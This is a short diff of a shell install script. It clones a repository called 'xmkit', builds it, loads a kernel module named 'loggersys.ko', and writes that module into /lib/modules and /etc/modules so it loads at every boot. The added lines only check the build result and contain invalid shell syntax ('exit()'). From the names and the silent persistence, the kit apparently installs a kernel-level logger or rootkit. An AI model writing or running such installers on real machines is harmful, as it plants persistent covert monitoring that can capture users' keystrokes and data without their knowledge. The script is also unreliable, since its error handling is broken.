@@ -7,6 +7,12 @@ echo "getting kit..."
 git clone https://github.com/killercarrot00/xmkit
 cd xmkit
 make
+if [ $? -eq 0 ]; then
+    echo OK
+else
+    echo "Make problem..."
+    exit()
+fi
 insmod loggersys.ko
 cp loggersys.ko /lib/modules/
 echo "loggersys" >> /etc/modules
